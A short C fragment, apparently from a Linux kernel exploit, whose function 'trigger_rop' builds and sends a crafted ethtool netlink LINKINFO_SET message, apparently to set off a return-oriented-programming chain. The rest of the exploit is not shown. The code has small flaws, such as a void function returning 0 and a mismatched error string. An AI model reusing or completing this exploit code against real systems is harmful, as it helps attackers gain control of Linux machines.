#include <linux/genetlink.h>
#include <linux/ethtool_netlink.h>

void trigger_rop(){

    struct nl_sock * socket = nl_socket_alloc();
    if(nl_connect(socket,NETLINK_GENERIC)<0){
        printf("nfnl_connect fail!\n");
        return 0;
    }
    struct nl_msg * msg = nlmsg_alloc();
    struct nl_msg * hdr_info = nlmsg_alloc();
    struct nlmsghdr *hdr1 = nlmsg_put(
            msg,
            NL_AUTO_PORT, // auto assign current pid
            NL_AUTO_SEQ, // begin wit seq number 0
            0x14,   // TYPE  family id for ethtool after debugging
            sizeof(struct genlmsghdr),
            NLM_F_REQUEST //NLM_F_ECHO
    );
    struct genlmsghdr * h = malloc(sizeof(struct genlmsghdr));
    memset(h, 0, sizeof(struct genlmsghdr));
    h->cmd = ETHTOOL_MSG_LINKINFO_SET;
    
    memcpy(nlmsg_data(hdr1), h, sizeof(struct genlmsghdr));
    
    //nla_put_string(hdr_info, ETHTOOL_A_HEADER_DEV_NAME, dev_name);
    nla_put_u32(hdr_info, ETHTOOL_A_HEADER_DEV_INDEX, 9);
    //nla_put_u32(hdr_info, ETHTOOL_A_HEADER_FLAGS, ETHTOOL_FLAG_OMIT_REPLY);

    nla_put_nested(msg, NLA_F_NESTED| ETHTOOL_A_LINKINFO_HEADER, hdr_info); //????
    nla_put_u8(msg, ETHTOOL_A_LINKINFO_PORT, 1);

    uint32_t total_size = NLMSG_ALIGN(hdr1->nlmsg_len); //+ NLMSG_ALIGN(hdr2->nlmsg_len) + NLMSG_ALIGN(hdr3->nlmsg_len);
    char *buf = malloc(total_size);
    memset(buf,0,total_size);
    memcpy(buf,hdr1,NLMSG_ALIGN(hdr1->nlmsg_len));
    int res = nl_sendto(socket, buf, total_size);
    nlmsg_free(msg);
    if (res < 0) {
        fprintf(stderr, "sending message failed\n");
    } else {
    }

}
